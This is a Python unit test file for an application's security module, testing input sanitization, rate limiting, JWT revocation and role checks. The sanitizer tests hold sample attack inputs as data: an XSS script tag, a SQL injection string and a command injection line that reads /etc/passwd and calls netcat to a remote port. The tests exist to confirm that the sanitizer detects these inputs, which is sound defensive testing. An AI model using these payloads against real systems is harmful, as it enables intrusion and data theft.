"""
Unit tests for Phase 13 Security Hardening & Compliance — rate limiting, sanitization, security headers, JWT blacklisting, and RBAC.
"""

from __future__ import annotations

import pytest

from app.security.jwt import JWTBlacklistManager
from app.security.rate_limiter import RateLimiter
from app.security.rbac import UserRole, require_roles
from app.security.sanitizer import InputSanitizer


class TestSecurityHardening:
    """Unit test suite for Phase 13 Security & Compliance."""

    def test_input_sanitizer_xss(self):
        malicious_xss = "<script>alert('xss')</script>"
        clean = InputSanitizer.sanitize_string(malicious_xss)

        assert "&lt;script&gt;" in clean
        assert InputSanitizer.check_xss(malicious_xss) is True
        assert InputSanitizer.is_safe_input(malicious_xss) is False

    def test_input_sanitizer_sqli(self):
        sqli_payload = "admin' OR '1'='1' --"
        assert InputSanitizer.check_sqli(sqli_payload) is True
        assert InputSanitizer.is_safe_input(sqli_payload) is False

    def test_input_sanitizer_cmd_injection(self):
        cmd_payload = "cat /etc/passwd; nc 10.0.0.1 4444"
        assert InputSanitizer.check_cmd_injection(cmd_payload) is True
        assert InputSanitizer.is_safe_input(cmd_payload) is False

    @pytest.mark.asyncio
    async def test_rate_limiter_local_fallback(self):
        limiter = RateLimiter.get_instance()
        client_ip = "192.168.1.105"

        for _ in range(5):
            limited = await limiter.is_rate_limited(client_ip, limit=10, window_seconds=60)
            assert limited is False

        for _ in range(10):
            limited = await limiter.is_rate_limited(client_ip, limit=10, window_seconds=60)

        assert limited is True

    @pytest.mark.asyncio
    async def test_jwt_blacklist_revocation(self):
        jwt_mgr = JWTBlacklistManager.get_instance()
        jti = "test-token-jti-88"

        assert await jwt_mgr.is_token_revoked(jti) is False
        await jwt_mgr.revoke_token(jti)
        assert await jwt_mgr.is_token_revoked(jti) is True

    def test_rbac_permission_hierarchy(self):
        admin_checker = require_roles([UserRole.ADMIN])
        analyst_checker = require_roles([UserRole.ANALYST])

        # Admin can access admin and analyst endpoints
        assert admin_checker.has_permission("ADMIN") is True
        assert analyst_checker.has_permission("ADMIN") is True

        # Investor cannot access admin endpoints
        assert admin_checker.has_permission("INVESTOR") is False
        assert analyst_checker.has_permission("INVESTOR") is False
